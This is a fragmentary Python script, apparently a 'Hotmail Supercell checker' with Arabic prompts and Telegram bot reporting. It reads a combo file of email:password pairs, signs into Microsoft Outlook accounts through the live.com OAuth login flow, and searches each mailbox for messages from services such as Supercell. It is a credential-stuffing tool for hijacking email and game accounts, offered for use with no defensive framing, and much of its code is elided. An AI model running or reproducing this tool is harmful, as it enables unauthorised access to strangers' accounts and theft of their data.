...
# Corrected color codes using raw strings
Z=r'\033[1;31m'
X=r'\033[1;33m'
Z1=r'\033[2;31m'
F=r'\033[2;32m'
...
# Global variables for Telegram bot, asked once
TELEGRAM_TOKEN = input('توكن : ').strip()
...
'PPFT'
:
'-Div0Bt28gmyaHIfgDZtd5xvxnb7eeDAQOIjXkqyoF1ekQB6gLEqbSdzNE05qpz*B1Q82VKHs*RNXPa8xZG1TJS5HGKjFMxGcQ51PMU77ulAR!JjAUTPM*Am5lkZU6Sa!wIdI6zYnUI8VYQHQOCJLb*lRsaiV5MhGQieznZ!EynMuuBHbBfLr28btqCBqLhzZXQ$$
'
,
'PPSX'
:
...
'Referer'
:
'https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid=a5b22c26bc704002ac309462e8d061bb&display=touch&username={username}'
,
'Accept-Language'
:
'en-US,en;q=0.9'
...
'#'
in location:
                            fragment=location.split(
'#'
)[1]
                            params=dict(x.split(
'='
)for x in fragment.split(
'&'
)if
'='
in x)
...
'uaid'
:
'db28da170f2a4b85a26388d0a6cdbb6e'
}
                token_headers={
'x-ms-sso-Ignore-SSO'
:
                    ...
                    for email,service in SV.items():
                        ...
                        try:
                            ...
                            if search_response.status_code==200:
                                ...
                                if
'EntityRequests'
in search_data and len(search_data[
'EntityRequests'
])>0:
                                    entity_data=search_data[
'EntityRequests'
][0]
                                    if
'Total'
in entity_data:
                                        total_msgs=int(entity_data[
'Total'
])
...
,start)
    ...
    def run_checker(self,combo_file):
        ...
        if not combos:
            print(f"{Z}No combos to check in {combo_file}{M}")
            return
...
def main(combo_file_path=None):
    checker=HotmailSupercellChecker()
    
    if combo_file_path is None:
        if len(sys.argv) > 1:
            combo_file_path = sys.argv[1]
        else:
            combo_file_path = input(f"{X}Enter combo file path: {M}").strip()
...
if __name__=="__main__":
    # If the script is run directly, and no command-line arguments are provided,
    # the main function will prompt for the combo file path.
    # Otherwise, it expects the combo file path as an argument.
    if len(sys.argv) > 1:
        main(sys.argv[1])
    else:
        main()
